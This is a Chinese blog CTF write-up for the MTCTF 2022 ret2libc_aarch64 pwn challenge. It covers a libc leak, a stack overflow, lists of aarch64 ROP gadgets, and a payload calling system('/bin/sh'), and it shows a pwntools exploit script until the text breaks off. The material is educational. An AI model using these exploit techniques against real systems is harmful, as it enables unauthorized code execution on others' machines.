<!DOCTYPE html><html lang="en"><head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
    <meta name="description" content="美团MTCTF 2022 smtp、ret2libc_aarch64 pwn解美团MTCTF 2022 ret2libc_aarch64 pwn解这是一道aarch64的pwn，正常的ret2libc，考察了aarch64下的指令运用笔者用的m1所以不需要使用qemu模拟1功能可以直接leak出libc地址2功能是一个栈溢出漏洞偏移128 + 8就可以覆盖到ret需要执行system(“/bin/">
<meta property="og:type" content="article">
<meta property="og:title" content="美团MTCTF 2022 smtp、ret2libc_aarch64 pwn解">
<meta property="og:url" content="https://www.z1r0.top/2022/09/20/%E7%BE%8E%E5%9B%A2MTCTF-2022-smtp%E3%80%81ret2libc-aarch64-pwn%E8%A7%A3/index.html">
<meta property="og:site_name" content="z1r0's blog">
<meta property="og:description" content="美团MTCTF 2022 smtp、ret2libc_aarch64 pwn解美团MTCTF 2022 ret2libc_aarch64 pwn解这是一道aarch64的pwn，正常的ret2libc，考察了aarch64下的指令运用笔者用的m1所以不需要使用qemu模拟1功能可以直接leak出libc地址2功能是一个栈溢出漏洞偏移128 + 8就可以覆盖到ret需要执行system(“/bin/">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://img-blog.csdnimg.cn/c01d7daff9844f66a43b8dff5f75497a.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/6041446302a0427c9e624c5f3152c89c.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/f4f8c31928b84c3c9e9fc5d42dc44251.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/f9943398c95f41c7a2ed34f4f909c507.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/f464509a8e0f40c8b3d7771b00f694be.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/49059a0cf1974252bcc134a617787be4.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/ce7726648a0d4c8581244d20e08db0b7.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/1789c63cd53743758c5a5ee873339ade.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/e4932b73057a4aaa90e13c3863ff0e61.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/e1203b1964e2470b8404b013dae12355.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/2cc105fbf1c043828323446464d6d4ec.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/0e0878f8631943a5955f8cec00a7e158.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/78a7bb2cff014929b5fb0de00e429c92.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/0c7dda55b9f643adbe938cfea0a4adb5.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/3daa99ee0d524186a61471a27c564fd5.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/9603a012a858422da2f241eb41e200e8.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/053c00dee4b74676ad9cb26c2a9083ba.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/6e45f2dc97ad44dda31290990ca4fa7c.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/90077da134a943899da3adab30f1c245.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/bf4b17d9648c45c3807851a9c7809212.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/9f528150666547b581caa01e2d917072.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/bea8e2de251943eea22a2164b28b9c56.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/0d33ec27e2374f0ea4e0d2c67dfb60b6.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/9a5e3f8a8d734c9eaad20bb80090078e.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/c97977429ea4425bba589d93be677d1c.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/460b938fa34a4311b09db535a9578c30.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/5eefdf4adcf34afbb7d3428f53fd56d0.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/602ca96d6f7947afa28a3f39fe4716a5.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/3d2019fe776046c2b5ae51bbafeacb81.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/de7b967b46f14c06bd86ef067f396cd1.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/135d04d95329469bad0e598f602b5e0d.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/469ab6fe5c49406d9cbeb74565123e5b.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/004089c5d957424b8cd397770090ed44.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/38bbcc5377844e6d955eeb03e72ffc18.png">
<meta property="article:published_time" content="2022-09-20T08:45:57.000Z">
<meta property="article:modified_time" content="2022-09-20T08:47:58.673Z">
<meta property="article:author" content="z1r0">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://img-blog.csdnimg.cn/c01d7daff9844f66a43b8dff5f75497a.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>美团MTCTF 2022 smtp、ret2libc_aarch64 pwn解</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.1.0"><link rel="alternate" href="/atom.xml" title="z1r0's blog" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00">Projects</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     -->
      </ul>
    </span>
    <br>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2022/10/06/CVE-2022-37130-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2022/08/29/CVE-2022-37133%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://www.z1r0.top/2022/09/20/%E7%BE%8E%E5%9B%A2MTCTF-2022-smtp%E3%80%81ret2libc-aarch64-pwn%E8%A7%A3/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://www.z1r0.top/2022/09/20/%E7%BE%8E%E5%9B%A2MTCTF-2022-smtp%E3%80%81ret2libc-aarch64-pwn%E8%A7%A3/&amp;text=美团MTCTF 2022 smtp、ret2libc_aarch64 pwn解"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://www.z1r0.top/2022/09/20/%E7%BE%8E%E5%9B%A2MTCTF-2022-smtp%E3%80%81ret2libc-aarch64-pwn%E8%A7%A3/&amp;title=美团MTCTF 2022 smtp、ret2libc_aarch64 pwn解"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://www.z1r0.top/2022/09/20/%E7%BE%8E%E5%9B%A2MTCTF-2022-smtp%E3%80%81ret2libc-aarch64-pwn%E8%A7%A3/&amp;is_video=false&amp;description=美团MTCTF 2022 smtp、ret2libc_aarch64 pwn解"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=美团MTCTF 2022 smtp、ret2libc_aarch64 pwn解&amp;body=Check out this article: https://www.z1r0.top/2022/09/20/%E7%BE%8E%E5%9B%A2MTCTF-2022-smtp%E3%80%81ret2libc-aarch64-pwn%E8%A7%A3/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://www.z1r0.top/2022/09/20/%E7%BE%8E%E5%9B%A2MTCTF-2022-smtp%E3%80%81ret2libc-aarch64-pwn%E8%A7%A3/&amp;title=美团MTCTF 2022 smtp、ret2libc_aarch64 pwn解"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://www.z1r0.top/2022/09/20/%E7%BE%8E%E5%9B%A2MTCTF-2022-smtp%E3%80%81ret2libc-aarch64-pwn%E8%A7%A3/&amp;title=美团MTCTF 2022 smtp、ret2libc_aarch64 pwn解"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://www.z1r0.top/2022/09/20/%E7%BE%8E%E5%9B%A2MTCTF-2022-smtp%E3%80%81ret2libc-aarch64-pwn%E8%A7%A3/&amp;title=美团MTCTF 2022 smtp、ret2libc_aarch64 pwn解"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://www.z1r0.top/2022/09/20/%E7%BE%8E%E5%9B%A2MTCTF-2022-smtp%E3%80%81ret2libc-aarch64-pwn%E8%A7%A3/&amp;title=美团MTCTF 2022 smtp、ret2libc_aarch64 pwn解"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://www.z1r0.top/2022/09/20/%E7%BE%8E%E5%9B%A2MTCTF-2022-smtp%E3%80%81ret2libc-aarch64-pwn%E8%A7%A3/&amp;name=美团MTCTF 2022 smtp、ret2libc_aarch64 pwn解&amp;description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://www.z1r0.top/2022/09/20/%E7%BE%8E%E5%9B%A2MTCTF-2022-smtp%E3%80%81ret2libc-aarch64-pwn%E8%A7%A3/&amp;t=美团MTCTF 2022 smtp、ret2libc_aarch64 pwn解"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BE%8E%E5%9B%A2MTCTF-2022-smtp%E3%80%81ret2libc-aarch64-pwn%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">美团MTCTF 2022 smtp、ret2libc_aarch64 pwn解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BE%8E%E5%9B%A2MTCTF-2022-ret2libc-aarch64-pwn%E8%A7%A3"><span class="toc-number">1.1.</span> <span class="toc-text">美团MTCTF 2022 ret2libc_aarch64 pwn解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BE%8E%E5%9B%A2MTCTF-2022-smtp-pwn%E8%A7%A3"><span class="toc-number">1.2.</span> <span class="toc-text">美团MTCTF 2022 smtp pwn解</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        美团MTCTF 2022 smtp、ret2libc_aarch64 pwn解
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
        <span itemprop="name">z1r0</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-09-20T08:45:57.000Z" itemprop="datePublished">2022-09-20</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/WP/">WP</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/pwn/" rel="tag">pwn</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="美团MTCTF-2022-smtp、ret2libc-aarch64-pwn解"><a href="#美团MTCTF-2022-smtp、ret2libc-aarch64-pwn解" class="headerlink" title="美团MTCTF 2022 smtp、ret2libc_aarch64 pwn解"></a>美团MTCTF 2022 smtp、ret2libc_aarch64 pwn解</h1><h2 id="美团MTCTF-2022-ret2libc-aarch64-pwn解"><a href="#美团MTCTF-2022-ret2libc-aarch64-pwn解" class="headerlink" title="美团MTCTF 2022 ret2libc_aarch64 pwn解"></a>美团MTCTF 2022 ret2libc_aarch64 pwn解</h2><p>这是一道aarch64的pwn，正常的ret2libc，考察了aarch64下的指令运用<br>笔者用的m1所以不需要使用qemu模拟<br><img src="https://img-blog.csdnimg.cn/c01d7daff9844f66a43b8dff5f75497a.png" alt="在这里插入图片描述"><br>1功能可以直接leak出libc地址<br>2功能是一个栈溢出漏洞<br><img src="https://img-blog.csdnimg.cn/6041446302a0427c9e624c5f3152c89c.png" alt="在这里插入图片描述"><br>偏移128 + 8就可以覆盖到ret<br>需要执行system(“/bin/sh”);<br>第一点，需要先控制x0（一参）<br>armv8里有一个指令可以对其进行赋值：<code>ldr</code>，先看一下pwn文件的gadgets</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">➜  mtctf_2022 cat g | grep <span class="string">'ldr x0'</span></span><br><span class="line"><span class="number">0x0000000000400990</span> : add x0, sp, #<span class="number">0x18</span> ; movz x2, #<span class="number">0x8</span> ; mov x1, x0 ; movz w0, #<span class="number">0</span> ; bl #<span class="number">0x4006c0</span> ; ldr x0, [sp, #<span class="number">0x18</span>] ; bl #<span class="number">0x4006b0</span> ; nop ; ldp x29, x30, [sp], #<span class="number">0x20</span> ; ret</span><br><span class="line"><span class="number">0x00000000004008a4</span> : adrp x0, #<span class="number">0x410000</span> ; ldr x0, [x0, #<span class="number">0xfc8</span>] ; ldr x0, [x0] ; movz x1, #<span class="number">0</span> ; bl #<span class="number">0x400660</span> ; movz w0, #<span class="number">0</span> ; ldp x29, x30, [sp], #<span class="number">0x10</span> ; ret</span><br><span class="line"><span class="number">0x0000000000400740</span> : adrp x0, #<span class="number">0x410000</span> ; ldr x0, [x0, #<span class="number">0xfe0</span>] ; cbz x0, #<span class="number">0x400750</span> ; b #<span class="number">0x400690</span> ; ret</span><br><span class="line"><span class="number">0x00000000004008a0</span> : bl #<span class="number">0x400660</span> ; adrp x0, #<span class="number">0x410000</span> ; ldr x0, [x0, #<span class="number">0xfc8</span>] ; ldr x0, [x0] ; movz x1, #<span class="number">0</span> ; bl #<span class="number">0x400660</span> ; movz w0, #<span class="number">0</span> ; ldp x29, x30, [sp], #<span class="number">0x10</span> ; ret</span><br><span class="line"><span class="number">0x0000000000400738</span> : bl #<span class="number">0x400680</span> ; bl #<span class="number">0x4006a0</span> ; adrp x0, #<span class="number">0x410000</span> ; ldr x0, [x0, #<span class="number">0xfe0</span>] ; cbz x0, #<span class="number">0x400750</span> ; b #<span class="number">0x400690</span> ; ret</span><br><span class="line"><span class="number">0x000000000040073c</span> : bl #<span class="number">0x4006a0</span> ; adrp x0, #<span class="number">0x410000</span> ; ldr x0, [x0, #<span class="number">0xfe0</span>] ; cbz x0, #<span class="number">0x400750</span> ; b #<span class="number">0x400690</span> ; ret</span><br><span class="line"><span class="number">0x00000000004009a0</span> : bl #<span class="number">0x4006c0</span> ; ldr x0, [sp, #<span class="number">0x18</span>] ; bl #<span class="number">0x4006b0</span> ; nop ; ldp x29, x30, [sp], #<span class="number">0x20</span> ; ret</span><br><span class="line"><span class="number">0x00000000004009a4</span> : ldr x0, [sp, #<span class="number">0x18</span>] ; bl #<span class="number">0x4006b0</span> ; nop ; ldp x29, x30, [sp], #<span class="number">0x20</span> ; ret</span><br><span class="line"><span class="number">0x00000000004008a8</span> : ldr x0, [x0, #<span class="number">0xfc8</span>] ; ldr x0, [x0] ; movz x1, #<span class="number">0</span> ; bl #<span class="number">0x400660</span> ; movz w0, #<span class="number">0</span> ; ldp x29, x30, [sp], #<span class="number">0x10</span> ; ret</span><br><span class="line"><span class="number">0x0000000000400744</span> : ldr x0, [x0, #<span class="number">0xfe0</span>] ; cbz x0, #<span class="number">0x400750</span> ; b #<span class="number">0x400690</span> ; ret</span><br><span class="line"><span class="number">0x00000000004008ac</span> : ldr x0, [x0] ; movz x1, #<span class="number">0</span> ; bl #<span class="number">0x400660</span> ; movz w0, #<span class="number">0</span> ; ldp x29, x30, [sp], #<span class="number">0x10</span> ; ret</span><br><span class="line"><span class="number">0x0000000000400998</span> : mov x1, x0 ; movz w0, #<span class="number">0</span> ; bl #<span class="number">0x4006c0</span> ; ldr x0, [sp, #<span class="number">0x18</span>] ; bl #<span class="number">0x4006b0</span> ; nop ; ldp x29, x30, [sp], #<span class="number">0x20</span> ; ret</span><br><span class="line"><span class="number">0x000000000040072c</span> : movk x4, #<span class="number">0</span>, lsl #<span class="number">32</span> ; movk x4, #<span class="number">0x40</span>, lsl #<span class="number">16</span> ; movk x4, #<span class="number">0xa38</span> ; bl #<span class="number">0x400680</span> ; bl #<span class="number">0x4006a0</span> ; adrp x0, #<span class="number">0x410000</span> ; ldr x0, [x0, #<span class="number">0xfe0</span>] ; cbz x0, #<span class="number">0x400750</span> ; b #<span class="number">0x400690</span> ; ret</span><br><span class="line"><span class="number">0x0000000000400730</span> : movk x4, #<span class="number">0x40</span>, lsl #<span class="number">16</span> ; movk x4, #<span class="number">0xa38</span> ; bl #<span class="number">0x400680</span> ; bl #<span class="number">0x4006a0</span> ; adrp x0, #<span class="number">0x410000</span> ; ldr x0, [x0, #<span class="number">0xfe0</span>] ; cbz x0, #<span class="number">0x400750</span> ; b #<span class="number">0x400690</span> ; ret</span><br><span class="line"><span class="number">0x0000000000400734</span> : movk x4, #<span class="number">0xa38</span> ; bl #<span class="number">0x400680</span> ; bl #<span class="number">0x4006a0</span> ; adrp x0, #<span class="number">0x410000</span> ; ldr x0, [x0, #<span class="number">0xfe0</span>] ; cbz x0, #<span class="number">0x400750</span> ; b #<span class="number">0x400690</span> ; ret</span><br><span class="line"><span class="number">0x000000000040099c</span> : movz w0, #<span class="number">0</span> ; bl #<span class="number">0x4006c0</span> ; ldr x0, [sp, #<span class="number">0x18</span>] ; bl #<span class="number">0x4006b0</span> ; nop ; ldp x29, x30, [sp], #<span class="number">0x20</span> ; ret</span><br><span class="line"><span class="number">0x000000000040089c</span> : movz x1, #<span class="number">0</span> ; bl #<span class="number">0x400660</span> ; adrp x0, #<span class="number">0x410000</span> ; ldr x0, [x0, #<span class="number">0xfc8</span>] ; ldr x0, [x0] ; movz x1, #<span class="number">0</span> ; bl #<span class="number">0x400660</span> ; movz w0, #<span class="number">0</span> ; ldp x29, x30, [sp], #<span class="number">0x10</span> ; ret</span><br><span class="line"><span class="number">0x0000000000400994</span> : movz x2, #<span class="number">0x8</span> ; mov x1, x0 ; movz w0, #<span class="number">0</span> ; bl #<span class="number">0x4006c0</span> ; ldr x0, [sp, #<span class="number">0x18</span>] ; bl #<span class="number">0x4006b0</span> ; nop ; ldp x29, x30, [sp], #<span class="number">0x20</span> ; ret</span><br></pre></td></tr></tbody></table></figure>
<p>之所以不找mov是因为mov x0在pwn文件里是没有的，利用还是挺难的, 都有跳转指令，因为前面泄露出了libc地址，可以试着在libc里面寻找gadgets</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x00000000000436dc</span> : ldp x25, x26, [sp, #<span class="number">0x40</span>] ; ldr x0, [sp, #<span class="number">0x80</span>] ; ldp x29, x30, [sp], #<span class="number">0xb0</span> ; ret</span><br><span class="line"><span class="number">0x00000000000b6514</span> : ldp x27, x28, [sp, #<span class="number">0x50</span>] ; ldr x0, [sp, #<span class="number">0x70</span>] ; ldp x29, x30, [sp], #<span class="number">0x1a0</span> ; ret</span><br><span class="line"><span class="number">0x000000000004353c</span> : ldp x27, x28, [sp, #<span class="number">0x50</span>] ; ldr x0, [sp, #<span class="number">0x80</span>] ; ldp x29, x30, [sp], #<span class="number">0xb0</span> ; ret</span><br><span class="line"><span class="number">0x00000000000436dc</span> : ldp x25, x26, [sp, #<span class="number">0x40</span>] ; ldr x0, [sp, #<span class="number">0x80</span>] ; ldp x29, x30, [sp], #<span class="number">0xb0</span> ; ret</span><br><span class="line"><span class="number">0x00000000000b6514</span> : ldp x27, x28, [sp, #<span class="number">0x50</span>] ; ldr x0, [sp, #<span class="number">0x70</span>] ; ldp x29, x30, [sp], #<span class="number">0x1a0</span> ; ret</span><br><span class="line"><span class="number">0x000000000004353c</span> : ldp x27, x28, [sp, #<span class="number">0x50</span>] ; ldr x0, [sp, #<span class="number">0x80</span>] ; ldp x29, x30, [sp], #<span class="number">0xb0</span> ; ret</span><br><span class="line"><span class="number">0x0000000000063e5c</span> : ldr x0, [sp, #<span class="number">0x18</span>] ; ldp x29, x30, [sp], #<span class="number">0x20</span> ; ret</span><br><span class="line"><span class="number">0x0000000000043540</span> : ldr x0, [sp, #<span class="number">0x80</span>] ; ldp x29, x30, [sp], #<span class="number">0xb0</span> ; ret</span><br></pre></td></tr></tbody></table></figure>
<p>再仔细筛选出上面的gadgets，这里用最简单的一个gadget来解，<code>0x0000000000063e5c</code><br><code>ldr x0, [sp, #0x18] ; ldp x29, x30, [sp], #0x20 ; ret</code><br><code>ldr x0, [sp, #0x18]</code>这个指令会将sp + 0x18这个地址内容给到x0，我们只需要在sp + 0x18这里填入bin_sh的地址即可。调试一下看一下需要放到哪个位置</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p1 = <span class="string">b'a'</span> * (<span class="number">128</span> + <span class="number">8</span>)</span><br><span class="line">p1 += p64(gadgets)</span><br></pre></td></tr></tbody></table></figure>
<p><img src="https://img-blog.csdnimg.cn/f4f8c31928b84c3c9e9fc5d42dc44251.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/f9943398c95f41c7a2ed34f4f909c507.png" alt="在这里插入图片描述"><br>粉色的是gadgets的地址，红色的最后会给到x0，所以我们在这里填入bin_sh地址<br>到了<code>ldp x29, x30, [sp], #0x20</code>这里，这条指令的含义是sp存储的地址放入x29，sp + 8放入x30，最后sp += 0x20，X30为程序链接寄存器，保存子程序结束后需要执行的下一条指令，所以我们需要将sp + 8这里填入system_addr<br><img src="https://img-blog.csdnimg.cn/f464509a8e0f40c8b3d7771b00f694be.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/49059a0cf1974252bcc134a617787be4.png" alt="在这里插入图片描述"><br>所以最后的payload可以为</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p1 = <span class="string">b'a'</span> * (<span class="number">128</span> + <span class="number">8</span>)</span><br><span class="line">p1 += p64(gadgets)</span><br><span class="line">p1 += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">p1 += p64(system_addr)</span><br><span class="line">p1 += p64(<span class="number">0</span>)</span><br><span class="line">p1 += p64(bin_sh)</span><br></pre></td></tr></tbody></table></figure>
<p><img src="https://img-blog.csdnimg.cn/ce7726648a0d4c8581244d20e08db0b7.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/1789c63cd53743758c5a5ee873339ade.png" alt="在这里插入图片描述"><br>成功调用system，同理上面还有gadgets可以使用<br>exp如下</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'aarch64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./pwn'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">r.sendlineafter(<span class="string">'&gt;'</span>, <span class="string">'1'</span>)</span><br><span class="line">r.sendafter(<span class="string">'sensible&gt;&gt;'</span>, p64(puts_got))</span><br><span class="line">r.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">puts_addr = u64(r.recvuntil(<span class="string">'\n'</span>)[-<span class="number">8</span>:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'puts_addr = '</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">li(<span class="string">'libc_base = '</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">li(<span class="string">'system_addr = '</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">bin_sh = libc_base + libc.search(<span class="string">b'/bin/sh'</span>).__next__()</span><br><span class="line">li(<span class="string">'bin_sh = '</span> + <span class="built_in">hex</span>(bin_sh))</span><br><span class="line">gadgets = <span class="number">0x0000000000063e5c</span> + libc_base</span><br><span class="line"><span class="comment">#0x0000000000063e5c : ldr x0, [sp, #0x18] ; 